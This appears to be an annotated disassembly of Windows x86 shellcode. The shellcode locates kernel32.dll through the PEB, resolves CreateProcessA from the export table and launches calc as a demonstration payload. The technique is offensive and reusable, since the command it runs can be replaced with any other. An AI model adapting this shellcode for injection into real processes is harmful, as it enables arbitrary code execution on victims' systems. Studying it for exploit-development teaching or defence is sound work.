

/**************************************************************************************************************************
						Disassembly in Intel Syntax
***************************************************************************************************************************/


Section 1: Find base address of kernel32.dll

      0:  31 c0                   xor    eax,eax                           // EAX = 0
      2:  64 8b 58 30             mov    ebx,DWORD PTR fs:[eax+0x30]       // EBX = PEB(Process Environment Block) // Using offset fs:0x30 (Segment:offset)
      6:  8b 5b 0c                mov    ebx,DWORD PTR [ebx+0xc]           // EBX = PEB_LDR_DATA // using offset 0xc
      9:  8b 5b 14                mov    ebx,DWORD PTR [ebx+0x14]          // EBX = LDR->InMemoryOrderModuleList // using offset 0x14 (First list entry)
      c:  8b 1b                   mov    ebx,DWORD PTR [ebx]               // EBX = second list entry (ntdll.dll) // in InMemoryOrderModuleList (offset 0x00)
      e:  8b 1b                   mov    ebx,DWORD PTR [ebx]               // EBX = third list entry (kernel32.dll) // in InMemoryOrderModuleList (offset 0x00)
      10: 8b 43 10                mov    eax,DWORD PTR [ebx+0x10]          // EAX = base address of kernel32.dll // using offset 0x10 from EBX

      13: 8b 78 3c                mov    edi,DWORD PTR [eax+0x3c]          // EDI = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
      16: 01 c7                   add    edi,eax                           // EDI = Address of PE signature = base address + RVA of PE signature
      18: 8b 57 78                mov    edx,DWORD PTR [edi+0x78]          // EDI = RVA of Export Table = Address of PE + offset 0x78
      1b: 01 c2                   add    edx,eax                           // EDI = Address of Export Table = base address + RVA of export table
      1d: 8b 7a 20                mov    edi,DWORD PTR [edx+0x20]          // EDI = RVA of Name Pointer Table = Address of Export Table + 0x20
      20: 01 c7                   add    edi,eax                           // ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table

      22: 31 db                   xor    ebx,ebx                           // EBX = 0
      24: 89 dd                   mov    ebp,ebx                           // EBP = 0

    loop:
      26: 8b 34 af                mov    esi,DWORD PTR [edi+ebp*4]         // ESI = PTR to the exported function name
      29: 01 c6                   add    esi,eax                           // ...
      2b: 45                      inc    ebp                               // Increment EBP
      2c: 81 3e 43 72 65 61       cmp    DWORD PTR [esi],0x61657243        // Name starts with "Crea"
      32: 75 f2                   jne    0x26                              // Jump to start of loop if its not equal
      34: 81 7e 08 6f 63 65 73    cmp    DWORD PTR [esi+0x8],0x7365636f    // Name has "oces" at char 9 ?
      3b: 75 e9                   jne    0x26                              // Jump to start of loop if its not equal
      3d: 8b 7a 24                mov    edi,DWORD PTR [edx+0x24]          // EDI = VA of the Ordinals table
      40: 01 c7                   add    edi,eax                           // ...
      42: 66 8b 2c 6f             mov    bp,WORD PTR [edi+ebp*2]           // BP = Ordinal number of CreateProcessA
      46: 8b 7a 1c                mov    edi,DWORD PTR [edx+0x1c]          // EDI = VA of the Entry Points Table
      49: 01 c7                   add    edi,eax                           // ...
      4b: 8b 7c af fc             mov    edi,DWORD PTR [edi+ebp*4-0x4]     // EDI = VA of CreateProcessA
      4f: 01 c7                   add    edi,eax                           // ...

Zero memory:
      51: 89 d9                   mov    ecx,ebx                          // Clear the stack
      53: b1 ff                   mov    cl,0xff
      55: 53                      push   ebx                              // Push 0
      56: e2 fd                   loop   0x55                             // 255 times

Push parameters:
      58: 68 63 61 6c 63          push   0x636c6163                        // Calc
      5d: 89 e2                   mov    edx,esp                           // EDX = "Calc"
      5f: 52                      push   edx                               // Push EDX
      60: 52                      push   edx                               // Push EDX
      61: 53                      push   ebx                               // Push EBX
      62: 53                      push   ebx                               // Push EBX
      63: 53                      push   ebx                               // Push EBX
      64: 53                      push   ebx                               // Push EBX
      65: 53                      push   ebx                               // Push EBX
      66: 53                      push   ebx                               // Push EBX
      67: 52                      push   edx                               // Push EDX
      68: 53                      push   ebx                               // Push EBX
      69: ff d7                   call   edi                               // Call CreateProcessA


